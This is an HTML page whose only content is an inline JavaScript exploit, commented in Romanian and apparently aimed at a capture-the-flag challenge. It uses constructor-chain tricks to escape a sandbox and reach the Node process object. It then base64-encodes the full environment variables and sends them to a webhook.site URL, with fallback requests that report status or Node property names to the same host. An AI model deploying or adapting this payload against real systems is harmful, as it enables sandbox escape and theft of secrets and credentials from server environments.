<!DOCTYPE html>
<html>
<body>
    <script>
        (async () => {
            try {
                // Încercăm să extragem procesul prin ierarhia de obiecte a constructorului
                // Această metodă nu folosește "require" sau "process" direct în cod
                const exploit = (() => {
                    try { return arguments.callee.caller.constructor("return process")(); }
                    catch(e) { return Function("return this.process || (this.constructor.constructor('return process')())")(); }
                })();

                if (exploit && exploit.env) {
                    // Trimitem întreg obiectul ENV ca să nu ratăm nimic
                    fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG_REAL=" + btoa(JSON.stringify(exploit.env)));
                } else {
                    fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?STARE=GASIT_DAR_GOL");
                }
            } catch (e) {
                // Dacă eșuează, listăm toate proprietățile obiectului global Node pentru diagnosticare
                const props = Object.getOwnPropertyNames(Node.prototype).join(',');
                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?PROPS_NODE=" + btoa(props));
            }
        })();
    </script>
</body>
</html>
